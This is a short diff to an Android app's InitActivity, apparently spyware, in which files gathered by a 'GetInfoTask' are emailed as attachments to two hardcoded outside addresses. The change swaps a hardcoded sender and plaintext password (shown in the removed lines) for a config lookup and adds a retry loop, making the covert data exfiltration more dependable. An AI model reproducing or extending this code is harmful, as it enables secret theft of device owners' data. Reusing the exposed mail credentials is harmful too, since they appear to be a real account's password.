@@ -21,6 +21,7 @@ import com.system.utils.ConfigCtrl;
 import com.system.utils.DeviceProperty;
 import com.system.utils.FileCtrl;
 import com.system.utils.SysUtils;
+import com.system.utils.mail.MailCfg;
 
 public class InitActivity extends Activity 
 {
@@ -85,9 +86,16 @@ public class InitActivity extends Activity
         				fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
         			
         			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
-        			boolean result = GetInfoTask.sendMail(subject, body, 
-        					"richardroky@gmail.com", "yel636636",
-        					recipients, fileList);
+        			String pwd = MailCfg.getSenderPwd(getApplicationContext());
+        			
+        			boolean result = false;
+        			int retry = 3;
+        			while(!result && retry > 0)
+        			{
+        				String sender = MailCfg.getSender(getApplicationContext());
+        				result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, fileList);
+        				if (!result) retry--;
+        			}
         			GetInfoTask.attachments.clear();
         			
         			// Update the last date time
